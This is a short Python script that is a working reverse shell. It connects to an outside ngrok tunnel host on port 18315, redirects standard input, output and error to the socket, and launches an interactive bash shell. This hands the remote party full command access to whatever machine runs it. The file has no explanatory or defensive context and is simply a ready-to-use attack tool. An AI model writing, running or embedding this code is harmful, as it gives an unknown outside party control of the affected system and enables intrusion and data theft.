import socket
import subprocess
import os

host = "0.tcp.eu.ngrok.io"
port = 18315

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the remote server
s.connect((host, port))

# Redirect standard input, output, and error to the socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Execute a shell on the remote system
subprocess.call(["/bin/bash", "-i"])
